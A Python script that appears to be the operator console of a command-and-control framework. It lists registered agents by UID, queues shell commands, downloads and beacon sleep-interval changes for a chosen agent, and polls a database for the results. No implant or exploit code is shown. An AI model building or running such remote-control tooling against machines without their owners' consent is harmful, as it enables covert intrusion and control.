import commands_v2
import sqlite3
import time


#Menu
a = 0
a = input('\nChoose option: \n0 - Exit \n1 - List uids\n')
while a != '2':
    if a == '0':
        print('Exit...')
        raise KeyboardInterrupt
    elif a == '1':
        commands_v2.select_all_from_table(table = 'agents')
        UID = int(input('Choose UID: '))
        available_uids = commands_v2.get_agent_uids()
        # print(available_uids)
        if UID in available_uids:
            agent_hostname = commands_v2.get_agent_hostname(UID)
            a = '2'
        else:
            print('No sych UID available')
if a == '2':
    pwd = commands_v2.get_last_pwd_of_agent(UID)
    command = input(f'{pwd}> ' )
    while True:
        if command.split(" ")[0] == 'download':
            type_id = 2
        elif command.split(" ")[0] == 'sleepinterval':   
            type_id = 4   
            sleepinterval = command.split(" ")[1]
            if sleepinterval.isdigit():
                commands_v2.update_agent_sleepinterval(UID, sleepinterval)
            else:
                print(f'Error setting sleepinterval to {sleepinterval}')
                type_id = 3
        else:
            type_id = 3
        id_command = commands_v2.set_command(table='commands', agent_hostname=agent_hostname, type_id = type_id, command=command)
        pwd_old = pwd
        pwd, result = commands_v2.get_pwd_and_result_of_command(id_command)

        agent_sleepinterval = commands_v2.get_agent_sleepinterval(UID) if commands_v2.get_agent_sleepinterval(UID) >= 300 else 300
        
        # print(agent_sleepinterval)
        tries = int(agent_sleepinterval)/3
        retry = 0
        while not pwd:
            if retry <= tries:
                pwd, result = commands_v2.get_pwd_and_result_of_command(id_command)
                retry+=1
                time.sleep(3)
            else:
                result = f'Error executing of command id - {id_command}'
                commands_v2.insert_result_and_update_is_finished(pwd = pwd_old, command_id=id_command, response=result, agent_uid=UID)
                pwd = pwd_old


        print('\n', result + '\n')
        command = input(f'{pwd}> ' )
        

